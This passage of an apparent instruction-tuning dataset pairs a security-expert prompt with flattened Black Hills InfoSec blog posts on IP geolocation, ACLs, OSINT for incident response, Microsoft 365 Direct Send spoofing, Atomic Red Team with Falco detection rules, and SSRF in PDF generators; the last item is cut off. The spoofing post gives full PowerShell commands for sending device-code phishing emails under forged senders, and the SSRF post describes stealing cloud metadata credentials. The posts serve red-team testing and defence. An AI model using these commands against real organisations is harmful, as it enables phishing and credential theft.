an interesting problem for network engineers These mergers may result in significant network changes Most IP addresses are assigned dynamically and can change without the individual knowing There are several reasons why your IP address might change You could be assigned a new IP address when your router loses connection during a power outage or when it's reset A new IP address will be assigned when switching internet service providers IP addresses are recycled and reassigned to different people possibly in a different location The rumors and misconceptions about location data have resulted in several issues ARIN published a blog on their website in 2018 explaining that there is no master IP geolocation database and that they have no control over how third-party sites gather their data The blog even cited an academic paper published in 2017 that studied the accuracy of geolocation data The study concluded that city-level location data from ARIN should not be trusted In 2016 a Kansas family sued geolocation company MaxMind after living through what their lawyer called digital hell Police and government officials repeatedly visited the family farm to investigate various crimes missing persons and even a suicide attempt Eventually the family discovered the geolocation company MaxMind used the Kansas farm as the default location for 600 million IP addresses The company changed the default location to a lake in Kansas and the suit was privately settled A different family in South Africa has a similar issue again with MaxMind using their location by default for thousands of IP addresses There are many intricacies to the Internet Protocol but hopefully this will serve as a good starting point for foundational knowledge"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The Simplest and Last Internet-Only ACL You'll Ever Need</title>\n<taxonomies>General InfoSec Tips & Tricks, How-To, Informational, Jordan Drysdale, Advice from a Help Desk Tech, Networking</taxonomies>\n<creation_date>Thu, 30 Nov 2023 16:59:32 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "tl dr Implement this ACL using whatever network gear cloud ACL config or uncomplicated firewall you use to protect your networks Our IOT devices are on 10.99.99.0 24 for this example Also don't use non-RFC 1918 addressing on your internal networks Depending on your configuration the following pseudo-logic in the format of should work universally deny 10.99.99.0 24 10.0.0.0 8 any deny 10.99.99.0 24 172.16.0.0 12 any deny 10.99.99.0 24 192.168.0.0 16 any allow 10.99.99.0 24 0.0.0.0 0 any The Verbose Version Imagine this you are implementing a new netblock for your Roku TVs IOT devices and wireless guests They all need internet access and under no circumstances do they need access to anything else When they get a DHCP lease from your network you should provide them with a public DNS server or two in the lease offer Not all resolvers were created equally but OpenDNS and a few others may offer you a bit more privacy than the others Once your hosts have been provided a public IP address or two for name resolution the following ACL will result in your TVs being blocked from accessing anything RFC-1918 in four short and sweet lines This specific configuration will keep these hosts from accessing anything you address on standard internal network ranges deny 10.99.99.0 24 10.0.0.0 8 any deny 10.99.99.0 24 172.16.0.0 12 any deny 10.99.99.0 24 192.168.0.0 16 any allow 10.99.99.0 24 any any This will allow the segment to talk to any public IP address That's it that's all Thanks for reading -jd"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>OSINT for Incident Response (Part 1)</title>\n<taxonomies>Blue Team, General InfoSec Tips & Tricks, Incident Response, Informational, Patterson Cake, OSINT</taxonomies>\n<creation_date>Thu, 07 Dec 2023 17:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Being a digital forensics and incident response consultant is largely about unanswered questions When we engage with a client they know something bad happened or is happening but they are uncertain of the how when where and why A significant component of our job is to tease out the known knowns the known unknowns and effectively and efficiently help the client answer the following Have we been compromised If yes then How long have we been compromised dwell time What accounts and systems have been impacted?What was the method of compromise patient zero What data was accessed and or exfiltrated In several recent cases open-source intelligence OSINT has been instrumental in helping to answer these questions A compromise usually occurs because something changed from misconfigurations to zero-day exploits to end-user behaviors and the avenue of attack is most frequently the internet OSINT can quickly and easily give us visibility into what the internet knows about the client organization If the internet knows the threat actors know and as incident responders we need to know As a DFIR consultant an engagement begins with client contact Based solely on that initial contact we have some critical data points the name of the organization their email domain and a timeline from which to start Given a few minutes warning I'll engage in OSINT before even joining that initial client call The following stories are less about the technical how-to or the specific tools portals than about making the point that whether you are a consultant or an internal resource OSINT for IR is valuable and should be part of your investigative process Case 1 3 Days from Misconfiguration to Ransomware As usual the call came late Friday afternoon Ransomware notes spewing from all network-attached printers was a fair indicator that my weekend plans were ruined but I'm getting ahead of myself Based on the first touchpoint with the client I knew their primary TLD top-level domain and jumped right into my 5-minute OSINT routine First drum roll please my email enumeration secret weapon Name Server Lookup ba-dum-bum-ching Yep good 'ol nslookup I just want to enumerate their mail server Super quick and easy from Linux or Windows specify MX Mail Exchanger record type and a reliable public DNS source Google DNS in the example below and mash Enter about 15 seconds start to finish nslookup -type mx companydomainname.com 8.8.8.8 nslookup Command Example About 98 of the time I made that statistic up I'll see something like companydomainname-com.protection.outlook.com indicating they are using M365 for their email Generally I want to quickly rule out that they have self-hosted email or be prepared to talk to the client about potential impact to their M365 Azure environments if indicated In this specific engagement the client appeared to have on-prem Microsoft Exchange From an attack surface perspective this is definitely worth noting Super valuable For the 15 seconds invested worth a quick check and I've gained one potentially valuable clue If I know the client engagement is a business email compromise BEC case I might stop there If not I'll cast a bit wider of a net by using their top-level-domain TLD to lookup IP address ranges in use pivoting to internet attack surface search engines I like DNS Dumpster for this next step because it's quick easy to use and easy to interpret I'm most interested in ISP-allocated IP blocks e.g COMCAST-1234 or LOCALISP-AS-01 as opposed to CLOUDFLARENET MICROSOFT-CORP etc Not that I'll ignore the latter but self-hosted on-prem infrastructure seems to be the likelier devil's playground And of course I'll take copious notes screenshots etc of everything I learn for future reference spoiler alert this is important to this case nsdumpster.com IP blocks of Interest from DNS Dumpster If DNS Dumpster returns a long list of IP blocks take a hint from the IP listed in the SPF portion of their TXT records for a place to start If you're playing along you may also note that the MX record is listed here in case you want to skip using nslookup in the future and jump right to DNS Dumpster Next I perused the Host A Records within the context of a local ISP looking for standouts e.g exchange.companydomainname.com or remote.companydomainname.com In lieu of a standout entry or two I took a stab at the range of addresses in use by the client e.g 10.1.0.128 25 or 10.1.0.129-140 that's a private address range I'm just using it as an example here and headed to Shodan.io If you don't have a Shodan.io account then you can't use search filters which presents a bit of a challenge But you can still search for an IP or TLD Worst-case scenario you can filter via an alternative then re-visit Shodan.io with an IP of interest see options below hodan.io Sample Shodan.io IP Range Search I used a range as above or you can use a net 10.1.0.128 25 filter From there I reviewed 'TOP PORTS for standouts Common ports like 80 and 443 aren't very exciting and just go in my notes I'm more interested in unusual ports or remote-access ports like 445 3389 or 22 In this case I saw two that were noteworthy 3389 Remote Desktop Protocol and what looked like a non-standard web-services port Next I clicked on port 3389 to see associated IP addresses then clicked on an IP for details It's important that you check and document the last seen dates Copious notes and screenshots are your friend Screenshot of Open Port 3389 including Date Last Seen Screenshot of Open Port 3389 including Date Last Seen Side note Shodan.io is certainly not the only attack surface search engine option Even if it is your go-to I highly recommend having more than one solution see Case Study 2 Censys and LeakIX are a couple options both providing search capabilities without registering and a bit more functionality upon free registration Censys.io example earch.censys.io 'ip 10.1.0.129 to 10.1.0.140 or 'ip 10.1.0.128 25 Example IP Range Search on Censys LeakIX.net example eakix.net Service ip 10.1.0.128 25 Example IP Subnet Search on Leakix Remember this is not deep-dive analysis It should take longer to read this post than to perform the actual queries I'm just doing a quick attack surface gut check Anything glaring Anything that might inform further investigation Document everything for future reference Armed with some OSINT perspective we kicked off the client engagement and were initially consumed with containment and eradication A couple days into the incident while doing some event-log analysis I noted a significant number of 4625 events indicating failed logon from public IP sources According to the client this should not have been possible as they had no publicly accessible authentication portals Additionally the date times didn't line up with what we knew about the current incident Puzzling until I revisited my OSINT notes which indicated Remote Desktop was open to the internet on at least one public IP address associated with the client organization After a quick check with the client network engineers regarding public IP to private IP firewall mapping we had a specific host to investigate We pulled a triage collection noted remote-access software installation at 3 00 AM from an unauthorized account unwound the timeline from there and found patient zero the initial point of compromise As it turns out a few days prior the client swapped out their primary firewalls remember the something changed axiom migrating and modifying previous configurations The old configuration allowed a single non-standard port inbound from the internet to a web-application remember our earlier Shodan.io observations Somehow in the translation to the new firewalls that single inbound port allow turned into a 1 1 NAT network address translation mapping allowing all ports inbound including Remote Desktop as we noted via Shodan.io and SMB to the web-application server Unfortunately these changes were made by a third party and the client was not happy about the unintended exposure They were keenly interested in how we discovered patient zero and specifically about the dates and times that the internet became aware of this misconfiguration Thankfully I'd grabbed screenshots of my Shodan.io forays which helped from an external validation perspective showing first seen and last seen exposure As you might imagine this was instrumental in client-vendor discussions about causality and culpability for this incident Finding patient zero can be extremely challenging especially in a large distributed enterprise but it is critical to informing the remediation and recovery phases of IR In this case given enough time we would have eventually discovered patient zero but the 5-minute OSINT routine dramatically reduced time to discovery and provided invaluable context for misconfiguration timelines to the client Case 2 Metadata and a New-Fashioned Bank Robbery In the next installment of OSINT for IR we'll dig a little deeper and unravel a targeted attack against a financial institution Thanks for reading Enjoy what you read Then check out Patterson's webcast released the day as this blog Rapid Windows Endpoint Investigations with Velociraptor KAPE w Patterson"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Spamming Microsoft 365 Like It's 1995</title>\n<taxonomies>Phishing, Red Team, Social Engineering, Steve Borosh</taxonomies>\n<creation_date>Thu, 14 Dec 2023 16:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "I previously blogged about spoofing Microsoft 365 using the direct send feature enabled by default when creating a business 365 Exchange Online instance ww.blackhillsinfosec.com spoofing-microsoft-365-like-its-1995 Using the direct send feature it may be possible to send emails from outside or inside of the organization to other users in the tenant by design A smart host is created with the default Exchange Online instance at company.mail.protection.outlook.com A quick nslookup company.mail.protection.outlook.com will show the IP addresses of the smart host if it exists If a TLD is associated with the Azure tenant the smart host may have a -TLD like company-io.mail.protection.outlook.com In this blog post I will cover some default protections provided by Microsoft show my research methodology land some spoofed device code phishing emails in a default tenant inbox and discuss mitigations Default Protections Some default protections do apply from the start as documented here earn.microsoft.com en-us microsoft-365 security office-365-security anti-spam-protection-about?view o365-worldwide default-anti-spam-policy Per Microsoft's documentation Every organization has a built-in anti-spam policy named Default that has the following properties The policy is the default policy the IsDefault property has the value True and you can't delete the default policy The policy is automatically applied to all recipients in the organization and you can't turn it off The policy is always applied last the Priority value is Lowest and you can't change it .1 Exchange Online Protection EOP helps reduce junk email using proprietary spam filtering also known as content filtering EOP attempts to learn from known spam and phishing threats to protect end-users EOP's spoof intelligence attempts to detect if an email was spoofed and either sends it to Junk still making it into the user's mailbox or sends it to Quarantine Figure 1 Spoof Intelligence Exchange Online administrators can create policies above the default policies but may not disable them The strictest policies are applied first.2 Conducting Research Preemptive disclaimer Throughout this research results varied due to the proprietary nature of Microsoft's email protections An email with a 'from address from a certain domain might make it to inboxes in a tenant with default protections but not another tenant with unidentified filter tags applied Real-world testing against domains with Exchange Online and a third-party email gateway resulted in successful spoofing as well with varying domains that were not on an allow list Organizations should follow similar procedures to test the efficacy of anti-spoofing and SPAM filters To evaluate default SPAM protections against an .onmicrosoft.com business tenant I used the Azure Cloud33 shell to send messages via SMTP through the target organization's Direct Send smart host .mail.protection.outlook.com Though it is possible to use telnet yes I said telnet PowerShell provides the Send-MailMessage command that wraps the connection for you Figure 2 Send-MailMessage You may use an html-formatted file as a template Note that the -Body flag takes a string format Convert the html file into a string like so email Get-Content email.html Out-String To simplify the research process I wrote a PowerShell script to wrap Send-Mail message into an easy-to-use email defense efficacy testing tool ithub.com rvrsh3ll FindIngressEmail I used a very simple device code html template as shown below If your target uses the Outlook desktop client application the app will display a non href tag URL as a link which may lower the SPAM score in some content filtering instances Figure 3 Device Code Template Note The Azure Console will timeout after 20 minutes of inactivity I suggest using Start-Job to background your command Then keep the terminal alive with watch ls If you're testing a single target domain you might use a command like Start-Job -name asciiDeviceCode -ScriptBlock Import-Module home rev FindIngressEmails.ps1 Invoke-FindIngressEmail -smtpServer .mail.protection.outlook.com -Subject Microsoft 365 Session Sync Required -bodyFile home rev DeviceCodePhish.html -fromFile home rev from_domains.txt -toEmail _ -Delay 10 -Encoding ascii The first test was spoofed from noreply globo.com to three separate default-protected Microsoft 365 tenants such as bydesign REDACTED.onmicrosoft.com Figure 4 Target User Example Figure 5 Sending Ascii Device Code Phish The results started entering junk folders as seen below Figure 6 Ascii Device Code Phish Result The ascii encoded email landed in two of three mailboxes junk folders It did not land in the bydesign mailbox Oddly it was not in quarantine either Figure 7 Quarantine I tried the same email again from the same IP address and Cloud Shell hostname This time with UTF32 encoding Figure 8 Sending UTF32 Encoded Phish This time the emails landed in the junk folders of all three mailboxes Figure 9 UTF32 Encoded Phish in Junk-1 Figure 10 UTF32 Encoded Phish in Junk-2 Next to test whether the Cloud Shell IP range had any visible effect I restarted the shell to obtain a new IP address and re-send the emails Figure 11 UTF32 Encoded Phish in Junk-2 Next I changed the subject of the email and re-sent Figure 12 Subject Change These emails also landed in the junk folders I changed the encoding to UTF7 and observed the results also landing in the junk folders Figure 13 UTF7 Phish Figure 14 UTF7 Encoded Email in Junk To dive a little deeper into the why this landed in the junk folder I used ha.azurewebsites.net to parse the headers Figure 15 Analyzing utf-7 Email Headers Next I used this script ithub.com mgeeky decode-spam-headers to further analyze the headers It can output a handy html file for review python decode-spam-headers.py globo_header.txt -f html -o report.html The script will identify SPAM headers Figure 16 Globo.com SPAM Headers Using a different domain email from address noreply eircom.net I re-sent the same campaign Figure 17 Ascii Encoded Email from EIRCOM in Inbox The same email template email landed in all three inboxes this time This shows that the From domain's email authorization settings such as SPF DKIM and DMARC may play a significant role in Microsoft's determination of the SPAM confidence level Figure 18 Analyzing Ascii Headers I then parsed these headers with the python script to show the difference between the globo.com header Figure 19 Eircom.net SPAM Headers Notice the confidence level dropped to -1 The emails contain a X-EOPTenantAttributedMessage header I noticed this header did not identify the remote tenant that I sent the messages from It identified the receiving tenant ID Figure 20 Tenant Attribution These tests were performed using default tenant settings in Exchange Online Protection Additional testing was performed against Black Hills Information Security BHIS ANTISOC customers using a mix of additional filters transport rules and third-party email gateways In all cases where the smart host allowed sending of emails into the organization BHIS was successful in landing device code phishing emails in the inbox of the organization Including using Known-Bad templates such as the original TokenTactics device code phishing template ithub.com rvrsh3ll TokenTactics blob main resources example_phish.html To test a large number of sending domains the FindIngressEmails.ps1 script will take a list of email addresses one-per-line Import-Module FindIngressEmails.ps1 Invoke-FindIngressEmail -smtpServer yourclientorg.mail.protection.outlok.com -Subject Device Reset -bodyFile emailTemplate.html -toEmail test.user yourclientorg.com -Delay 15 -RetryDelay 60 Lastly I sent a few hundred of these phishes to the three tenant simultaneously Figure 21 133 Inbox The first account received 133 inbox and 207 in junk Figure 22 41 Inbox The next mailbox had 41 in the inbox and 174 in junk Figure 23 5 Inbox A quick peek at ecurity.microsoft.com quarantine shows some landed in quarantine as well Figure 24 Quarantined Emails The results are very inconsistent between tenants however the test shows that the same template is interpreted differently for various some proprietary Microsoft rules For Defenders Unfortunately I haven't found a method to completely disable the smart host on Exchange Online Since posting the original blog4 about spoofing Microsoft 365 the only effective solution I've encountered doubtfully exhaustive is to secure the smart host by restricting sending emails on behalf of the organization to IP address or certificate.5 Closing I hope this blog post highlights the need for Exchange Online administrators to continuously test the effectiveness of their inbound email controls and secure the Direct Send smart host from allowing arbitrary unauthenticated users from sending spoofed emails into the organization References"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Better Together: Real Time Threat Detection for Kubernetes with Atomic Red Tests & Falco</title>\n<taxonomies>Blue Team, Blue Team Tools, Guest Author, How-To, Informational, art, cdr, cloud, falco, ids, realtime, tests</taxonomies>\n<creation_date>Thu, 04 Jan 2024 16:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Nigel Douglas As a Developer Advocate working on Project Falco Nigel Douglas plays a key role in driving education for the Open-Source Detection and Response D R segment of cloud-native security at Sysdig He spends his time drafting articles blogs and taking the stage to help bring awareness to how security needs to change in the cloud In cloud-native environments where applications scale up and down much faster than traditional monolithic application architectures the ability to proactively identify and respond to threats in real time is paramount As more organizations embrace cloud-native architectures for application delivery more robust security measures need to be introduced In this blog post we delve into the dynamic realm of Kubernetes threat detection by exploring how open-source Falco can seamlessly detect Atomic Red Team tests in real time within Kubernetes environments Atomic Red Team is a powerful framework designed to simulate real-world attacks providing organizations with a controlled environment to validate the effectiveness of their security measures We take this a step further by contributing a single Kubernetes Deployment manifest to speed-up the deployment and testing of Atomic Red tests in Kubernetes clusters via a single command simulating useful attack scenarios to test the responsiveness of existing open-source cloud-native intrusion detection systems such as Falco Our journey begins with the effortless deployment of Atomic Red to Kubernetes showcasing the simplicity and efficiency of orchestrating security testing within containerized environments Once deployed we invoke specific Atomic Red Team tests simulating a range of threat scenarios The true test lies in Falco's ability to detect these threats in line with the MITRE ATT CK framework a globally recognized matrix mapping adversary techniques to defensive tactics This exploration is not just about identifying threats it's a collaborative effort to enhance security coverage in Kubernetes Should we identify any gaps in Falco's detection capabilities we can dive deeper revising the executed techniques and crafting custom rules This iterative process aims to extend MITRE ATT CK coverage aligning Atomic Red tests with the industry's best practices for threat detection and mitigation in Kubernetes Deploying Atomic Red Team To avoid any potential service disruption in production environments we recommend installing Atomic Red in a test lab environment or at least a staging environment of Kubernetes We have a step-by-step video for installing Atomic Red in Kubernetes ww.youtube.com watch?v 5QjGnHGnxxo Before we start the deployment remember to create the atomic-red network namespace kubectl create ns atomic-red A single pod will be deployed with privileged set to true Atomic Red requires admin-level securityContext to perform certain actions that require elevated permissions kubectl apply -f Note This creates a pod called 'atomicred in the 'atomic-red network namespace You can check on the state of the installation with the below command kubectl get pods -n atomic-red If you ever want to remove the Atomic Red project from your Kubernetes cluster simply run kubectl delete deployment atomicred -n atomic-red Familiarize Yourself with Atomic Red Tests Once deployed you will need to shell into the Atomic Red pod to perform the following test scenarios This might seem a little confusing but Atomic Red was developed with PowerShell in mind so the below instructions ask the user to shell into a container and once they are in the running pod they must run PowerShell to import and invoke the various Atomic Test scenarios Once you are familiar with this logic you'll find Atomic Red is a truly simple security simulation tool kubectl exec -it -n atomic-red deploy atomicred bash As mentioned you need to run PowerShell once you are in the Atomic Red pod pwsh Now you can finally load the Atomic Red Team module Import-Module AtomicRedTeam invoke-atomicredteam Invoke-AtomicRedTeam.psd1 -Force Check the details of the TTPs Invoke-AtomicTest T1070.004 -ShowDetails Check the prerequisites to ensure the test conditions are right Invoke-AtomicTest T1070.004 -GetPreReqs You can see in the below screenshot there are no prerequisites required to perform these tests As a result we can invoke the bulk file deletion test scenario Remove the feature flags to execute the test simulation Invoke-AtomicTest T1070.004 This test will attempt to delete individual files or individual directories When we have Falco installed this Atomic test should trigger the 'Warning bulk data removed from disk rule by default Next we discuss Falco's installation Congrats Now that we know how Atomic Red works let's install Falco and run it side-by-side against Atomic Red to prove it detects these tests in real time We will need to open two terminal windows to see the real-time response detections Installing Testing Falco For this lab guide we can install Falco via Helm on a fixed version prior to the segregation of rules into different rules feeds such as 'incubating 'sandbox and 'stable The reason we are doing this is to ensure all Falco rules are accessible in our lab scenario To use the latest version of Falco simply remove the '--version feature flag from the Helm install script helm install falco falcosecurity falco --namespace falco --create-namespace --set tty true --version 3.3.0 Just like the Atomic Red deployment we need to monitor the progress of the Falco installation The pods will change state a few times during the installation but should eventually all be in a 'RUNNING status after about a minute or so.Please use the below command to check on the status change of Falco pods kubectl get pods -n falco -w Once Falco is installed we can track the events as they are generated using the following command in the second terminal window kubectl logs -f --tail 0 -n falco -c falco -l app.kubernetes.io name falco Jump back into the first terminal window and re-run the bulk file deletion Atomic Test 'T1070.004 Invoke-AtomicTest T1070.004 You're going to identify certain noise in the detection rules For example all Atomic Tests are run under the 'Root user therefore we will always get a detection for scripts running under root To ignore this noise let's instead just check for the specific Falco rule we are looking to detect kubectl logs -f --tail 0 -n falco -c falco -l app.kubernetes.io name falco grep 'Bulk data has been removed from disk Hurrah We see the exact detection matching the context of the Atomic Red test scenario Let's move on to the next Atomic Test to invoke There are a bunch of test scenarios for Linux that you can test out today Check out the list on the official Atomic Red Team Github project ithub.com redcanaryco atomic-red-team blob master atomics Indexes Indexes-Markdown linux-index.md T1556.003 Modify Authentication Process In this scenario Atomic Red generates three Pluggable Authentication Modules PAM two malicious PAM rules for Linux and FreeBSD as well as a malicious PAM module for Linux These programs can be used to open and read sensitive file content and we can agree that they are non-trusted programs Again we have an out-of-the-box rule homas.labarussias.fr falco-rules-explorer ?source syscalls hash 5116b3ca0c5fad246cc41ca67938a315 for these activities kubectl logs -f --tail 0 -n falco -c falco -l app.kubernetes.io name falco grep 'Sensitive file opened for reading by non-trusted program Now it's time to simulate our threat Invoke-AtomicTest T1556.003 T1036.005 Masquerading Match Legitimate Name or Location This test scenario executes a process from a directory masquerading as the current parent directory kubectl logs -f --tail 0 -n falco -c falco -l app.kubernetes.io name falco grep 'Executing binary not part of base Now it's time to simulate our threat Invoke-AtomicTest T1036.005 You can see that in the left terminal window there is an echo message in the terminal saying Hello from the Atomic Red Team Any string output in the command line can also be detected in Falco's outputs T1070.002 Indicator Removal on Host Adversaries may clear system logs to hide evidence of an intrusion macOS and Linux both keep track of system or user-initiated actions via system logs The majority of native system logging is stored under the var log directory kubectl logs -f --tail 0 -n falco -c falco -l app.kubernetes.io name falco grep 'Log files were tampered Now it's time to simulate our threat Invoke-AtomicTest T1070.002 T1070.003 Clear Command History In addition to clearing system logs an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion Various command interpreters keep track of the commands users type in their terminals so that users can retrace what they've done kubectl logs -f --tail 0 -n falco -c falco -l app.kubernetes.io name falco grep 'Shell history had been deleted or renamed Now it's time to simulate our threat Invoke-AtomicTest T1070.003 You can see from the below screenshot that four different operations were performed Therefore four unique Falco detections were triggered on those individual attempts to clear the command line history T1014 Loadable Kernel Module Based Rootkit Adversaries may use Rootkits to hide the presence of programs files network connections services drivers and other system components Rootkits are programs that hide the existence of malware by intercepting hooking and modifying operating system API calls that supply system information Rootkits may reside at the user or kernel level in the operating system or lower to include a hypervisor Master Boot Record or System Firmware As such it's critical that Falco detects Rootkits in real time kubectl logs -f --tail 0 -n falco -c falco -l app.kubernetes.io name falco grep 'Linux Kernel Module injection from container detected Now it's time to simulate our threat Invoke-AtomicTest T1014 Falco is detecting the Linux kernel module injection attempt whether it was a successful execution or not T1037.004 CUSTOM RULE Boot Initialization RC Scripts Adversaries may establish persistence by modifying RC scripts that are executed during a Unix-like system's startup These files allow system administrators to map and start custom services at startup for different run levels RC scripts require root privileges to modify Command to simulate the 'T1037.004 test Invoke-AtomicTest T1037.004 You'll notice that this is the first test where we don't get a useful Falco detection related to the threat As a result we need to create a 'custom-rules.yaml file with the custom Falco rule for detecting boot initialization scripts cat custom-rules.yaml This rule detects base64-encoded Python scripts on command line arguments condition spawned_process and proc.cmdline contains python -c or proc.cmdline contains python3 -c or proc.cmdline contains python2 -c and proc.cmdline contains echo or proc.cmdline icontains base64 or proc.cmdline contains import and proc.cmdline contains base64 and proc.cmdline contains decode output Potentially malicious Python script encoded on command line proc.cmdline proc.cmdline user.name user.name proc.name proc.name proc.pname proc.pname evt.type evt.type gparent proc.aname 2 ggparent proc.aname 3 gggparent proc.aname 4 evt.res evt.res container.id container.id container.name container.name file fd.name priority warning tags T1037.004 MITRE_Defense_Evasion source syscall EOF Adversaries can establish persistence by adding a malicious binary path or shell commands to 'rc.local 'rc.common and other RC scripts specific to the Unix-like distribution Upon reboot the system executes the script's contents as root resulting in persistence Let's try upgrading Falco to reflect the 'custom-rules.yaml file helm upgrade falco falcosecurity falco -n falco --set tty true --version 3.3.0 --reuse-values -f custom-rules.yaml Granted there's no obvious formatting issues when creating the 'custom-rules.yaml manifest you should be able to successfully upgrade Falco and the pods should be in a 'RUNNING state If there was an issue with the custom rules file the Falco pod state will likely change to 'CrashLoopBackOff Let's see if we detect the Atomic test after upgrading Falco with the newly-created custom rule Remember to have Falco running in a second terminal window with the following command kubectl logs -f --tail 0 -n falco -c falco -l app.kubernetes.io name falco grep 'Potentially malicious Python script We can simulate the technique ID 'T1037.004 one last time Invoke-AtomicTest T1037.004 Hurrah We detected the boot initialization scripts with the above command To recap adversaries looking to abuse those RC scripts are especially effective for lightweight Unix-like distributions using the root user as default such as IoT or embedded systems If you are wondering why the Falco rule was specifically looking at Base64-encoded Python scripts well we need to look back at the details associated with the Atomic test simulation Invoke-AtomicTest T1037.004 -ShowDetails We can see from the command that it is using the 'python3 command to run Python scripts However the script itself is executed as a base64-encoded string to evade some traditional detection tools Conclusion In conclusion the adoption of Kubernetes in cloud-native systems has ushered in a new era of efficiency and scalability but with these advantages comes the pressing need for robust threat detection and response mechanisms Recognizing this imperative security teams can leverage the power of Kubernetes deployment manifests to streamline the deployment of security tools exemplified by the Atomic Red program Rather than engaging in the laborious task of building the Atomic Red program from scratch or managing its tests through a Docker container the innovative use of a Kubernetes deployment manifest allows security professionals to execute a single command This capability enables swift and dynamic scaling of the Atomic Red pod within Kubernetes clusters providing a responsive and adaptable security solution It is essential to acknowledge that the prevalence of Linux endpoints powering Kubernetes nodes necessitates a focus on Linux-centric atomic tests While Kubernetes itself is not limited to Linux distributions this article serves as an introduction to the utilization of the Atomic Red Kubernetes manifest emphasizing its effectiveness in enhancing security responsiveness within Kubernetes environments A special acknowledgement is due to Thomas Labarussias from Project Falco ISSIF on Github ithub.com Issif for his contribution in crafting the image for the deployment manifest Through collaborative efforts and innovative solutions like the Atomic Red Kubernetes manifest the security landscape in cloud-native ecosystems takes a significant step forward reinforcing the resilience and adaptability of organizations in the face of evolving threats"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Hunting for SSRF Bugs in PDF Generators</title>\n<taxonomies>How-To, Sean Verity, Web App</taxonomies>\n<creation_date>Thu, 11 Jan 2024 15:56:52 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "If you've been on a website and noticed one of the following features there's a good chance you've stumbled upon a hot spot for server-side request forgery SSRF bugs Print a certificate of completion Generate a report Submit a digital signature Before getting into the nuts 'n bolts of how to find and exploit SSRF bugs in PDF generators let's go through a quick thought experiment I want to give you a simple mental snapshot of what is going on when a PDF is generated in a web application Imagine that you saved a very basic web page into an HTML file on your desktop and named it ssrf.html The web page uses JavaScript to fetch an image and add it to the web page It looks like this Then imagine opening that HTML file and saving it to a PDF with your web browser's Print feature The browser parsed HTML executed JavaScript and requested a remote image file to generate a PDF As you can imagine there could be some serious implications if an attacker can influence the HTML that the PDF is generated from Here are a few things you could attack with an SSRF bug IMDS If the server is hosted in the cloud e.g AWS Azure or GCP there's a good chance you'll be able to interact with its instance metadata service IMDS If luck is on your side and AWS IMDSv1 is enabled you'll probably be able to leak AWS temporary security credentials from the IAM endpoint or plaintext credentials from the user-data endpoint PDF Generator The PDF generating component itself may be vulnerable Host Service Discovery You will almost certainly be able to interact with other services running on the server or systems that are not publicly accessible Where to Start Look at the PDF and take note of any data in it that you provided to the application such as name address digital signature etc These are good parameters to investigate During your investigation there are a few questions you'll want to answer Can I inject HTML Can I access remote servers Can I execute JavaScript Is the server that's rendering my PDF cloud hosted Are there any known vulnerabilities in the component that's generating the PDF What other services or systems can I interact with Am I giving it enough time This last question is actually a story to highlight a challenge and solution I encountered while hunting an elusive SSRF bug The lesson might prove useful if you find yourself in a similar situation As you work through testing potential sources you'll either get visual cues in the generated PDF callbacks to an out-of-band server like Burp Collaborator1 or a combination thereof If you've ever exploited a cross-site scripting XSS vulnerability the first few questions should be familiar Exploiting SSRF bugs in PDF generators is very much like exploiting XSS bugs The big difference is that you don't have the DOM right in front of you since it's all happening on the server The mindset is very similar though Can I inject HTML There are three likely contexts where your payload is landing on the server In between HTML tags Wrapped with apostrophes inside an HTML entity attribute Wrapped with quotation marks inside an HTML entity attribute As alluded to earlier you probably won't see what you're injecting into so you'll have to do some investigation to determine which context your payload is landing in Payloads highlighted are shown in the code blocks that follow If a given payload renders then you know what context your payload is landing in A quick note on the last two contexts where your payload is landing inside of an HTML entity attribute If you have a Pro license for Burp an automated scan finding of External HTTP Interaction is likely indicative of the last two contexts If you don't have a Pro license try pasting a URL to an image into the payload position If the image appears in the PDF that's also a pretty good indication that your payload is landing in one of the last two contexts In between HTML tags Your payload might be landing in between a couple of HTML tags In which case try injecting one or two HTML elements Using two elements can be handy because if the 